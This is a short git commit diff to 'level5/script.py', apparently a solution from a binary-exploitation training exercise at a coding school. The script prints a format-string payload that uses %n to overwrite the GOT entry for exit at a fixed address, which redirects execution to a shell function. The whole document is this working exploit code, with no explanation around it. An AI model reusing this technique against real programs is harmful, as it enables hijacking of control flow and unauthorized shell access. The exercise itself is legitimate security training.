b7769f0bf252f52aaae4f4d22052374706b486aa
Azeddine El makkaoui <ael-makk@e2r7p13.1337.ma>
2022-11-16 13:13:28 +0100

    level5 source

--- level5/script.py
+++ level5/script.py
@@ -1,6 +1,4 @@
 import struct
 
-shell = 0x80484a4
-got = struct.pack("I", 0x8049838)
-
-print got + " %134513824p%4$n"
+exit_got = struct.pack("I", 0x8049838)
+print exit_got + " %134513824p" + "%4$n"
